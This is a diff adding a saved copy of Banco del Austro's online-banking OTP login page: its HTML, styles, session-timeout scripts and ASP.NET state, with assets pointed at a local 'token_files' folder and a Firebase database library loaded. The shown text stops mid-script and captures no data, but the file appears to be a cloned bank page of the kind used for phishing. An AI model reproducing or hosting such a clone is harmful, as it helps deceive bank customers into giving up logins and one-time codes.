@@ -1,0 +1,1664 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0055)https://www.baustroonline.com/Registro/frmOTPLogin.aspx -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script src="./token_files/common.js.descarga"></script><script id="8d4985e3a0f45330b223bf4f6708391e" src="./token_files/common(1).js.descarga" async=""></script><title>
+	Validación OTP Login - Banco del Austro OnLine - Ecuador
+</title><meta name="referrer" content="always">
+    <!-- REQ-ST -->
+    
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    <link rel="icon" href="https://www.baustroonline.com/recursos/cambio/favicon.png"><link href="./token_files/Styles.css" type="text/css" rel="stylesheet"><link href="./token_files/estilosKeypad.css" type="text/css" rel="STYLESHEET"><link href="./token_files/ba-estilo.css" type="text/css" rel="stylesheet"><link href="./token_files/jquery-ui3.css" type="text/css" rel="stylesheet"><link type="text/css" href="./token_files/bavirtual2015.css" rel="stylesheet"><link href="./token_files/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous"><link rel="stylesheet" href="./token_files/bootstrap-icons.min.css">
+
+    <style type="text/css">
+        @font-face {
+            font-family: Assistant;
+            src: url("/Styles/fonts/400-Assistant-Regular.ttf") format('truetype');
+        }
+		 @font-face {
+            font-family: Assistant-Medium;
+            src: url("/Styles/fonts/500-Assistant-Medium.ttf") format('truetype');
+        }
+		 @font-face {
+            font-family: Assistant-ExtraBold;
+            src: url("/Styles/fonts/800-Assistant-ExtraBold.ttf") format('truetype');
+        }
+		 @font-face {
+            font-family: Assistant-Bold;
+            src: url("/Styles/fonts/700-Assistant-Bold.ttf") format('truetype');
+        }
+		
+
+        @font-face {
+            font-family: Latinotype_Texta_Black;
+            src: url("/Styles/fonts/Latinotype - Texta Black.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: Latinotype_Texta_Bold;
+            src: url("/Styles/fonts/Latinotype - Texta Bold.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: Latinotype_Texta_Book;
+            src: url("/Styles/fonts/Latinotype - Texta Book.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: Latinotype_Texta_Heavy;
+            src: url("/Styles/fonts/Latinotype - Texta Heavy.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: Latinotype_Texta_Medium;
+            src: url("/Styles/fonts/Latinotype - Texta Medium.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: Latinotype_Texta_Regular;
+            src: url("/Styles/fonts/Latinotype - Texta Regular.otf") format("opentype");
+        }
+
+        @font-face {
+            font-family: MyriadPro_Regular;
+            src: url("/Styles/fonts/MyriadPro.otf") format("opentype");
+        }
+
+        /* xxl */
+        @media (min-width: 1400px) {
+            .main-content {
+                position: fixed;
+                margin-left: 285px;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+        /* xl */
+        @media (min-width: 1200px) and (max-width: 1399.98px) {
+            .main-content {
+                position: fixed;
+                margin-left: 285px;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+        /* lg */
+        @media (min-width: 992px) and (max-width: 1199.98px) {
+            .main-content {
+                position: fixed;
+                margin-left: 285px;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+         /* md */
+        @media (min-width: 768px) and (max-width: 991.98px) {
+            .main-content {
+                position: fixed;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+         /* sm */
+        @media (min-width: 576px) and (max-width: 767.98px) {
+            .main-content {
+                position: fixed;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+            /* xs */
+        @media (max-width: 575.98px) {
+            .main-content {
+                position: fixed;
+                top: 10%;
+                width: -webkit-fill-available;
+                height: 100%;
+                overflow-y: auto;
+            }
+        }
+
+        .main-content-expanded {
+            position: fixed;
+            top: 10%;
+            width: -webkit-fill-available;
+            height: 100%;
+            overflow-y: auto;
+        }
+
+        .main-spinner {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            margin: auto;
+            color: #00166A;
+            z-index: 999999;
+        }
+    </style>
+    <script type="text/javascript">
+
+        document.addEventListener("DOMContentLoaded", function (event) {
+            var tipoCuenta = 'persona';
+            if (tipoCuenta == "" || tipoCuenta == "persona") {
+                document.getElementById("tableHeader").innerHTML +=
+                    '<tr id="headerPersonas"><td class="tdLogoHeader" style="background-color: #1C2B4D"> <img class="logoHeader" src="../recursos/cambio/logo-ba-virtual.png" alt="" style ="width: 290.4px; height: 50.15px;"/></td><td class="tdSubLogoHeader" style="background-color: #1C2B4D"><img class="subLogoHeader" src="../recursos/cambio/lobo-ba-personas.png" alt="" style ="width: 143px; height: 45.91px;"/></td></tr>';
+            } else {
+                document.getElementById("tableHeader").innerHTML += '<tr id="headerEmpresas"><td class="tdLogoHeader" style="background-color: #1C2B4D"><img class="logoHeaderOnly" src="../recursos/cambio/logo-ba-virtual.png" alt=""  style ="width: 290.4px; height: 50.15px;"/></td></tr>';
+            }
+            //REQ-ST
+            $("#modalSessionTimeout").on('hidden.bs.modal', function () {
+                continueSessionFlag = false;
+                pageLoad();
+            });
+            //REQ-ST
+            $("#modalSessionTimeout").on('shown.bs.modal', function (event) {
+                document.querySelector("#btnContinueSession").focus();
+            });
+            //REQ-ST
+            validateClientSession().then((res) => {
+                if (res === 'false') {
+                    CloseSession();
+                }
+            });
+        });
+
+
+        //localizar timers
+        var iddleTimeoutWarning = null;
+        var iddleTimeout = null;
+
+        //esta funcion automaticamente sera llamada por ASP.NET AJAX cuando la pagina cargue y un postback parcial complete
+        function pageLoad() {
+            //REQ-ST
+            validateClientSession().then((res) => {
+                if (res === 'false') {
+                    CloseSession();
+                }
+            });
+            ContinueSession();//REQ-ST
+            //borrar antiguos timers de postbacks anteriores
+            if (iddleTimeoutWarning != null) {
+                clearTimeout(iddleTimeoutWarning);
+            }
+            if (iddleTimeout != null) {
+                clearTimeout(iddleTimeout);
+            }
+            //leer tiempos desde web.config
+            var millisecTimeOutWarning = 0 * 60 * 1000;
+            var millisecTimeOut = 3 * 60 * 1000;
+            sessionConfirmationTimeSeconds = 60;//REQ-ST
+			urlOnSessionExpired = "https://www.baustroonline.com/frmSalir.aspx";//REQ-ST
+            //establece tiempo para mostrar advertencia si el usuario ha estado inactivo
+            if (millisecTimeOutWarning > 0){
+                iddleTimeoutWarning = setTimeout("DisplayIddleWarning()", millisecTimeOutWarning);
+            }
+            if (millisecTimeOut > 0){
+                iddleTimeout = setTimeout("TimeoutPage()", millisecTimeOut);
+            }
+        }
+		 
+        function DisplayIddleWarning() {
+            alert("Tu sesion esta a punto de expirar por motivo de seguridad.");
+        }
+		 
+        let sessionTimerId;//REQ-ST
+		let sessionConfirmationTimeSeconds = 60;//REQ-ST
+		let urlOnSessionExpired;//REQ-ST
+		let lblConfirmSessionTimer;//REQ-ST
+		let modalIsShow=false;//REQ-ST
+        function TimeoutPage() {
+		    //REQ-ST
+			lblConfirmSessionTimer = document.querySelector("#lblConfirmSessionTimer");
+			let secondsCounter = sessionConfirmationTimeSeconds;
+			try {
+				lblConfirmSessionTimer.textContent=sessionConfirmationTimeSeconds;
+                $('#modalSessionTimeout').modal('show');
+				modalIsShow=true;
+                sessionTimerId = setInterval(() => {
+                    validateSessionConfig().then((res) => {
+                        if (res === 'false') {
+                            CloseSession();
+                        }
+                    });
+				  if(lblConfirmSessionTimer){
+				    lblConfirmSessionTimer.textContent=secondsCounter;
+                    if (secondsCounter <= 0) {
+                        clearInterval(sessionTimerId);
+                        modalIsShow = false;
+                        CloseSession();
+                        return;
+                    }
+                      secondsCounter--;
+				  }
+				}, 1000);
+			} catch (error) {
+			  CloseSession();
+			}			
+        }
+		
+        //REQ-ST
+		function ContinueSession() {
+		    try {
+			  if(sessionTimerId){
+		        clearInterval(sessionTimerId);
+		      }
+			  if(lblConfirmSessionTimer){
+			  	lblConfirmSessionTimer.textContent=sessionConfirmationTimeSeconds;
+			  }
+			  if(modalIsShow){
+			    $('#modalSessionTimeout').modal('hide');
+				modalIsShow = false;
+			  }
+		    } finally {
+			}
+		}
+		//REQ-ST
+		function CloseSession() {
+			try {
+			    modalIsShow = false;
+				//actualizar pagina para este ejemplo, podriamos redirigir a otra pagina con codigo para eliminar variables de sesion
+                var urlSalir = "https://www.baustroonline.com//frmSalir.aspx";
+                $.get(urlSalir);
+                urlOnSessionExpired = "https://www.baustroonline.com/frmSalir.aspx";//REQ-ST
+                if (urlOnSessionExpired) {
+                    urlSalir = urlOnSessionExpired;
+                }
+                window.location = urlSalir;
+            } finally {
+            }
+        }
+
+
+        function SeteaEvento(obj) {
+            pageLoad();
+            //REQ-ST
+            try {
+                continueSessionFlag = true;
+                // Get a reference to the iframe document
+                var iframeDoc = $('#OtroSitio').contents().get(0);
+                // Bind event to iframe document
+                $(iframeDoc).bind('click', function (event) {
+                    pageLoad();
+                });
+            } finally {
+            }
+        }
+
+        const rootPath = "/frmPrincipal.aspx/";
+        async function validateClientSession() {
+            try {
+                const request = await send("ValidateClientSession");
+                if (request) {
+
+                    if (request.status != 200) { console.log(request.status + " " + request.statusText); }
+                    else {
+                        const result = await request.json();
+                        return result.d;
+                    }
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        }
+        async function validateSessionConfig() {
+            try {
+                const request = await send("ValidateSessionConfig");
+                if (request) {
+                    if (request.status != 200) { console.log(request.status + " " + request.statusText); }
+                    else {
+                        const result = await request.json();
+                        return result.d;
+                    }
+                }
+            } catch (e) {
+                console.log(e);
+            }
+        }
+        //return promise
+        function send(method) {
+            const headers = {
+                'Accept': 'application/json',
+                'Content-Type': 'application/json; charset=utf-8'
+            };
+            if (method) {
+                if (sessionConfirmationTimeSeconds && urlOnSessionExpired) {
+                    const dt = JSON.stringify({
+                        "timeout": sessionConfirmationTimeSeconds,
+                        "url": urlOnSessionExpired
+                    });
+                    const body = {
+                        body: dt
+                    }
+                    const dataSend = JSON.stringify(body);
+                    const request = fetch(rootPath + method,
+                        {
+                            method: 'POST',
+                            headers: headers,
+                            body: dataSend
+                        });
+                    return request;
+                }
+            }
+        }
+
+        function toggleIcon() {
+            let icon = document.getElementById("toggle-icon");
+            if (icon.classList.contains("bi-chevron-down")) {
+                icon.classList.remove("bi-chevron-down");
+                icon.classList.add("bi-chevron-up");
+            } else {
+                icon.classList.remove("bi-chevron-up");
+                icon.classList.add("bi-chevron-down");
+            }
+        }
+
+    </script>
+
+    
+    <script type="text/javascript" src="./token_files/chart.umd.min.js.descarga"></script>
+
+    <script type="text/javascript">
+        var navegacionInterna = false;
+
+        window.addEventListener('submit', function () {
+            navegacionInterna = true;
+        });
+
+        document.addEventListener('click', function () {
+            navegacionInterna = true;
+        });
+
+        if (typeof __doPostBack === 'function') {
+            var originalDoPostBack = __doPostBack;
+
+            __doPostBack = function () {
+                navegacionInterna = true;
+                return originalDoPostBack.apply(this, arguments);
+            };
+        }
+
+        var esRecarga = false;
+
+		document.addEventListener('keydown', function (e) {
+			if (e.key === 'F5' || (e.ctrlKey && e.key.toLowerCase() === 'r')) {
+				esRecarga = true;
+			}
+		});
+
+        window.addEventListener('beforeunload', function (event) {
+            var isReload = false;
+
+            if (window.performance) {
+                var navEntries = performance.getEntriesByType("navigation");
+                if (navEntries.length > 0) {
+                    var navType = navEntries[0].type;
+                    if (navType === "reload") {
+                        isReload = true;
+                    }
+                }
+            }
+            if (isReload || esRecarga || navegacionInterna) {
+                navegacionInterna = false;
+                return;
+            }
+            var url = '/frmPrincipal.aspx/CerrarSesionBeacon';
+            var blob = new Blob(['{}'], { type: 'application/json; charset=UTF-8' });
+            navigator.sendBeacon(url, blob);
+        });
+    </script>
+</head>
+<body onclick="pageLoad();" oncontextmenu="return true;" style="font-family: &#39;Assistant&#39;; background-color: #F5F9FF; height: 100vh; margin: 0; padding: 0;">
+
+   
+
+
+    <form id="form-login" style="height: 100%">
+<div>
+<input type="hidden" name="ctl00_ScriptManager1_HiddenField" id="ctl00_ScriptManager1_HiddenField" value=";;AjaxControlToolkit, Version=1.0.20229.20821, Culture=neutral, PublicKeyToken=28f01b0e84b6d53e:es-PE:c5c982cc-4942-4683-9b48-c2c58277700f:411fea1c:865923e8:e7c87f07:91bd373d:fc56e238">
+<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
+<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="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">
+</div>
+
+<script type="text/javascript">
+//<![CDATA[
+var theForm = document.forms['aspnetForm'];
+if (!theForm) {
+    theForm = document.aspnetForm;
+}
+function __doPostBack(eventTarget, eventArgument) {
+    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
+        theForm.__EVENTTARGET.value = eventTarget;
+        theForm.__EVENTARGUMENT.value = eventArgument;
+        theForm.submit();
+    }
+}
+//]]>
+</script>
+
+
+<script src="./token_files/WebResource.axd" type="text/javascript"></script>
+
+
+<script src="./token_files/ScriptResource.axd" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+if (typeof(Sys) === 'undefined') throw new Error('ASP.NET Ajax client-side framework failed to load.');
+//]]>
+</script>
+
+<script src="./token_files/ScriptResource(1).axd" type="text/javascript"></script>
+<script src="./token_files/EventosCliente.js.descarga" type="text/javascript"></script>
+<script src="./token_files/FuncionesWindows.js.descarga" type="text/javascript"></script>
+<script src="./token_files/ValidaFecha.js.descarga" type="text/javascript"></script>
+<script src="./token_files/AC_RunActiveContent.js.descarga" type="text/javascript"></script>
+<script src="./token_files/jquery-3.6.0.js.descarga" type="text/javascript"></script>
+<script src="./token_files/bootstrap.js.descarga" type="text/javascript"></script>
+<script src="./token_files/jquery.keyboard.js.descarga" type="text/javascript"></script>
+<script src="./token_files/FuncionesSC.js.descarga" type="text/javascript"></script>
+<script src="./token_files/frmOTPLogin.aspx" type="text/javascript"></script>
+<div>
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="781099B3">
+	<input type="hidden" name="__VIEWSTATEENCRYPTED" id="__VIEWSTATEENCRYPTED" value="">
+</div>
+        <!-- Seteo para que AJAX espere 2 horas (7200 seg) -->
+        <!-- REQ-ST (add bootstrap) -->
+        <script type="text/javascript">
+//<![CDATA[
+Sys.WebForms.PageRequestManager._initialize('ctl00$ScriptManager1', 'aspnetForm', ['tctl00$objctrCab$uPnlSidebar','','tctl00$upnlMenu','','tctl00$objctrPie$UPpaneles','','tctl00$pnlInfoMsg',''], [], [], 7200, 'ctl00');
+//]]>
+</script>
+
+
+
+        <div id="ctl00_pnlCab" style="width:100%;">
+	
+            
+
+<style>
+    @font-face {
+        font-family: Latinotype_Texta_Heavy;
+        src: url("../Productos/Styles/FONTS/Latinotype - Texta Heavy.otf") format("opentype");
+    }
+
+    @font-face {
+        font-family: Latinotype_Texta_Medium;
+        src: url("../Productos/Styles/FONTS/Latinotype - Texta Medium.otf") format("opentype");
+    }
+
+    .ctl00_objctrCab_menSecundario_3, .ctl00_objctrCab_menSecundario_1, .ctl00_objctrCab_menSecundario_5 {
+        font: 13px Latinotype_Texta_Medium !important;
+        cursor: pointer !important;
+    }
+
+    .ctl00_objctrCab_menSecundario_3 a:hover {
+        font: 13px Latinotype_Texta_Medium !important;
+        font-weight: bold;
+    }
+
+    .ctl00_objctrCab_menSecundario_5 a:hover {
+        font: 13px Latinotype_Texta_Medium !important;
+        font-weight: bold;
+    }
+
+    .font_menu {
+        font: 13px Latinotype_Texta_Medium !important;
+    }
+
+    .font_header_desc {
+        font: 11px Latinotype_Texta_Medium !important;
+    }
+
+    .clsFondoMenuSec a:hover, .clsFondoMenuSec a:active, .clsFondoMenuSec a:focus {
+        color: #F1B634 !important;
+        <!-- TODO FREDDY background-color: #1C256A !important; -->
+        background-color: #1C2B4D !important;
+        font-weight: bold;
+        font: 13px Latinotype_Texta_Heavy !important;
+    }
+
+    .responsive-nav-text {
+        padding-right: 2rem;
+        padding-top: 1rem;
+        padding-bottom: 1rem;
+        padding-left: 0.5rem;
+    }
+
+    @media (max-width: 450px) {
+        .responsive-nav-text {
+            padding-right: 1rem;
+        }
+    }
+
+    @media (min-width: 450px) and (max-width: 577px) {
+        .responsive-nav-text {
+            padding-right: 1rem;
+        }
+    }
+
+    .nav-dropdown-link {
+        text-decoration: none;
+        color: #00166a;
+    }
+
+    .nav-dropdown-link:hover {
+        text-decoration: none;
+        cursor: pointer;
+        color: #00166a;
+    }
+
+    i {
+        color: #4361d7;
+    }
+
+    .nav-dropdown-text {
+        font-weight: 400;
+        font-size: 14px;
+        line-height: 14px;
+        color: #00166A;
+        margin-bottom: 0;
+    }
+
+    .responsive-img {
+        width: 100%;
+        height: auto;
+    }
+
+    @media (max-width: 450px) {
+        .responsive-img {
+            width: 100px;
+            padding-left: 10px;
+        }
+    }
+
+    @media (min-width: 450px) and (max-width: 577px) {
+        .responsive-img {
+            width: 80%;
+            padding-left: 10px;
+        }
+    }
+
+    @media (min-width: 577px) and (max-width: 992px) {
+        .responsive-img {
+            width: 80%;
+            padding-left: 10px;
+        }
+    }
+
+    @media (min-width: 993px) {
+        .responsive-img {
+            width: 100%;
+            padding-left: 10px;
+        }
+    }
+
+    a:link {
+        color: green;
+        background-color: transparent;
+        text-decoration: none;
+    }
+
+    a:visited {
+        color: pink;
+        background-color: transparent;
+        text-decoration: none;
+    }
+
+    a:hover {
+        color: red;
+        background-color: transparent;
+        text-decoration: underline;
+    }
+
+    a:active {
+        color: yellow;
+        background-color: transparent;
+        text-decoration: underline;
+    }
+
+
+    /* xs */
+    @media (max-width: 575.98px) {
+        .bda-sidebar {
+            display: none;
+            margin-right: 0;
+            background-color: white;
+            width: 100%;
+            height: auto;
+            position: relative;
+            top: 0;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    /* sm */
+    @media (min-width: 576px) {
+        .bda-sidebar {
+            display: none;
+            margin-right: 185px;
+            background-color: white;
+            width: 185px;
+            height: 100%;
+            position: fixed;
+            top: 10%;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    /* md */
+    @media (min-width: 768px) {
+        .bda-sidebar {
+            display: none;
+            margin-right: 235px;
+            background-color: white;
+            width: 235px;
+            height: 100%;
+            position: fixed;
+            top: 10%;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    /* lg */
+    @media (min-width: 992px) {
+        .bda-sidebar {
+            display: block;
+            margin-right: 285px;
+            background-color: white;
+            width: 285px;
+            height: 100%;
+            position: fixed;
+            top: 10%;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    /* xl */
+    @media (min-width: 1200px) {
+        .bda-sidebar {
+            display: block;
+            margin-right: 285px;
+            background-color: white;
+            width: 285px;
+            height: 100%;
+            position: fixed;
+            top: 10%;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    /* xxl */
+    @media (min-width: 1400px) {
+        .bda-sidebar {
+            display: block;
+            margin-right: 285px;
+            background-color: white;
+            width: 285px;
+            height: 100%;
+            position: fixed;
+            top: 10%;
+            bottom: 0;
+            left: 0;
+            overflow-y: auto;
+        }
+    }
+
+    .bda-mobile-sidebar {
+        background-color: white;
+        height: 100%;
+    }
+
+    .bda-sidebar-button {
+        position: fixed;
+        top: 10%;
+        bottom: 0;
+        left: 0;
+        height: min-content; 
+        margin-top: 1rem;
+        margin-left: 0.5rem;
+        background-color: #00166A;
+        color: white;
+        z-index: 100000;
+    }
+
+    .bda-sidebar-button:hover {
+        background-color: #003399; 
+        color: #CCCCCC;
+     }
+
+    .sidebar-item {
+        display: flex;
+        flex-direction: row;
+        justify-content: space-between;
+        align-items: center;
+        font-family: 'Assistant';
+        font-weight: 400;
+        font-size: 14px;
+        line-height: 16px;
+        color: #00166A;
+        padding-top: 10px;
+        padding-bottom: 10px;
+        padding-left: 20px;
+        padding-right: 20px;
+
+    }
+
+
+    .sidebar-item:hover {
+        cursor: pointer;
+        font-weight: 700;
+        font-size: 14px;
+        line-height: 18.31px;
+        color: #00166A;
+        background-color: #B2DAFF;
+    }
+
+</style>
+<script language="javascript">
+    /* Parche para usar control Mueno en UpdatePanel - AJAX */
+    if (typeof (Menu_HideItems) != "undefined") {
+        var oldMenu_HideItems = Menu_HideItems;
+        if (oldMenu_HideItems) {
+            Menu_HideItems = function (items) {
+                if (!items || ((typeof (items.tagName) == "undefined") && (items instanceof Event))) {
+                    items = __rootMenuItem;
+                }
+                if (items && items.rows && items.rows.length == 0) {
+                    items.insertRow(0);
+                }
+                return oldMenu_HideItems(items);
+            }
+        }
+    }
+
+
+
+    function KeyDownHandler(e) {
+        // process only the Enter key
+        tecla = (document.all) ? e.keyCode : e.which;
+        if (tecla == 13)//(event.keyCode == 13)
+        {
+            // cancel the default submit
+            if (e.keyCode) {
+                e.returnValue = false;
+                e.cancel = true;
+            }
+            else {
+                e.preventDefault();
+                e.stopPropagation();
+                e.cancelBubble = true;
+            }
+
+        }
+    }
+
+    function toggleIcon(name) {
+        let icon = document.querySelector(`#toggle-icon-${name}`);
+        if (icon.classList.contains("bi-chevron-down")) {
+            icon.classList.remove("bi-chevron-down");
+            icon.classList.add("bi-chevron-up");
+        } else {
+            icon.classList.remove("bi-chevron-up");
+            icon.classList.add("bi-chevron-down");
+        }
+    }
+
+    function addMarginLeft() {
+        let mainContent = document.getElementById("bdaMainContent");
+        mainContent.classList = "main-content";
+        let element = document.getElementById("btnToggleMobileSidebar");
+        element.style.visibility = 'visible';
+    }
+
+    function removeMarginLeft() {
+        let mainContent = document.getElementById("bdaMainContent");
+        mainContent.classList = "main-content-expanded";
+        let element = document.getElementById("btnToggleMobileSidebar");
